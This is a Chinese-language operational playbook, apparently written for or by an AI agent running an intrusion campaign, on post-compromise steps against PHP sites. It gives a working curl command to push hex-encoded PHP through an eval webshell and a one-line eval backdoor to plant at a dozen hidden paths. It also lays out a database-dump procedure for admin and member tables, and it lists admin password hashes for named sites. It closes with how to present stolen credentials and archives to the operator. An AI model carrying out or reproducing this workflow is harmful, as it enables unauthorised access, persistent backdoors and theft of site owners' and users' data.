# getshell 后：投递 / 拖库 / 多点持久化（2026-09-24）

适用：已有 `eval($_POST['qz'])` 类马（weihua/kszy 直马、czsd action-include）。

## 1. 投递纪律（form 编码坑）
### 1.1 键与内容
- POST 键必须是马约定的 **`qz`**（不是 JSON、不是 `code`）。
- body = **纯 PHP 语句**，禁止 `<?php … ?>`。
- 验活：`qz=echo 'XCEOK';` — PHP8 上裸 `echo XCEOK` 会 `Undefined constant`，**字符串必须加引号**。

### 1.2 不要直接 POST 大段 PHP
`application/x-www-form-urlencoded` 会把 **`+` 变空格**，打爆源码；多层引号也炸。

**稳妥投递（推荐）**：
```bash
# 本地 payload.php 去掉首行 <?php 后：
HX=$(python3 -c "print(open('payload.php').read().lstrip('<?php').encode().hex())")
curl -sS -d "qz=eval(hex2bin('$HX'));" -H 'Cookie: 365aixue=365aixue.com' \
  'http://TARGET/plugins/xce.php'
```
- `hex2bin` 路径无 `+`/空格问题；比 base64 在部分链上更稳（b64 也曾被截断/padding 坑）。
- 备选：`eval(base64_decode('…'));` 但长响应用远程写 `/tmp/x.b64` 再分段 `substr` 读回。

### 1.3 action-include 马（czsd）
- URL：`/index.php?action=data/<md5(CE)>_safe.txt`
- safe.txt 内需保持 `include(…cache/xce.php)` 或等价 TAG；**勿 lockfile 盖掉**。
- 同一 `qz=` 投递；响应用常黏 WAF 日志尾巴，解析时按 marker 切（`PERSIST_JSON:` / `DBCFG_JSON:` / `DUMP_DONE`）。

## 2. 多点持久化
一次 hex 投递写多个路径（能写则写）：
```
plugins/xce.php, plugins/qz.php, plugins/s.php, plugins/.sys_cache.php
plugins/apihq/index.php, plugins/comment/helper.php
data/cache/xce.php, data/cache/.sys.php, data/cache/session_boot.php
zzadmin/.keep.php, images/.i.php, uploads/.u.php
```
- 马体短：`<?php @error_reporting(0);if(isset($_POST["qz"])){@eval($_POST["qz"]);}`
- **nginx** 常 404/405：`data|images|uploads|templ` 下的 `.php`；`plugins` 白名单仍可能 **禁新建 .php**（czsd：`file_put_contents(plugins/*.php)=false`，但 `data/cache/*.php` 可写）。
- **禁止**试验 `.htaccess` / `.user.ini` 做 handler/prepend（整站 500）。
- 验活用 hex 投 `echo 'BDHIT';`，不要裸标识符。

### 同盘
weihua ↔ 588 同 `365jianzhan222`：一边写马两边 URL 都能打（PHP 小版本可能不同）。

## 3. 拖库
### 3.1 配置
```php
include $root."/data/config.global.php";
// $_config['default']['dbhost|dbname|dbuser|dbpwd|dbprefix']
```
- 不是旧 `$cfg_db*`；include 后空 → 自己 parse 或读文件正则。

### 3.2 流程
1. hex 投 dump 脚本 → 输出 `DBCFG_JSON:{…}` + 每表 `TBL_B64:…` + `DUMP_DONE`
2. 大表（arctype/archives/addon）`LIMIT` 或按 `LIMIT offset,batch` 远程写 `/tmp/*.b64` 再分段拉
3. 优先表全量：`zz_admin` / `zz_sysconfig` / `zz_plugin` / `zz_pluginvar` / `zz_member`
4. 落盘：`loot/DB_DUMP/<site>/meta.json` + `zz_*.json` + `config.global.php` + zip

### 3.3 管理员哈希
- 列 `pwd` = **`substr(md5(明文), 5, 20)`**（20 hex）
- 2026-09-24：weihua `addmin` 与 kszy `admin` **同哈希** `432dcc97adc0971daa72`；czsd `fha30fhg`=`b625458df636a7182a96`；小字典未爆。

### 3.4 CE 复核
`zz_sysconfig` 里 `varname=config_cookie_encode` 的 value 应与抽 CE 一致。

## 4. 用户交付口径
用户问「拿到了什么 / 列出来」→ **直接表格式清单**（马 URL、参数、DB 账密、admin 行、zip 路径），少叙事；zip 路径给绝对路径。

## 5. 参考脚本
- 战役内：`/root/monroediary/scripts/persist_and_dump4.py` + `payload_persist.php` / `payload_dump.php`
- 交付：`loot/DB_AND_BACKDOOR_DELIVER.md`、`loot/DB_*.zip`
